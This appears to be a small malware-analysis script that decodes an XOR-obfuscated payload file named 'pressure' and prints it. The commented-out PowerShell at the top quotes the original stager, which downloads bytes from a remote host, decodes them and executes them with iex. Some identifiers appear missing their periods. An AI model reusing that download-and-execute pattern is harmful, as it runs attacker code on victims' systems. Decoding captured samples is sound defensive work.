# $bytes = (New-Object NetWebClient).DownloadData('http://fdxdzinvalid/pressure')

# $prev = [byte] 195

# $dec = $(for ($i = 0; $i -lt $byteslength; $i++) {
#     $prev = $bytes[$i] -bxor $prev
#     $prev
# })

# iex([SystemTextEncoding]::UTF8GetString($dec))

enc = open("./pressure", "rb").read()
prev = 195
dec = b""

for i in enc:
    prev ^= i
    dec += bytes([prev])

print(dec.decode())
# open("malicious.ps1", "w").write(dec.decode())

